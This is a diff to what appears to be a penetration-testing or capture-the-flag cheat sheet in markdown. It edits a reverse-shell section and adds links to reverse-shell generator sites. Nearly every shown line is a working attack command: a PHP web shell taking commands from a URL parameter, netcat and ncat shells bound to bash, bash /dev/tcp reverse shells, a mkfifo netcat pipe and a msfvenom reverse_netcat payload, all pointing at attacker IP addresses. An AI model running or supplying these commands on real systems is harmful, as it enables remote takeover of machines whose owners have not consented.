@@ -42,11 +42,16 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lo
 <?php echo system($_GET["cmd"]); ?>
 nc 10.11.99.141 5555 -e bash
 ncat 10.11.99.141 5555 -e bash
-/bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+/bin/bash -c /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.10 lport=8888 R
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
- msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.10 lport=8888 R
 ```
-[Other_Reverse_Shell_Site](https://www.revshells.com/)
+[Other_Reverse_Shell_Site](https://tex2e.github.io/reverse-shell-generator/index.html)
+
+[Pentestmonkey-Reverse-Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+[PayloadsAllTheThings-Reverse-shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 # Port-Forwarding ✅
 ## SSH ✡️
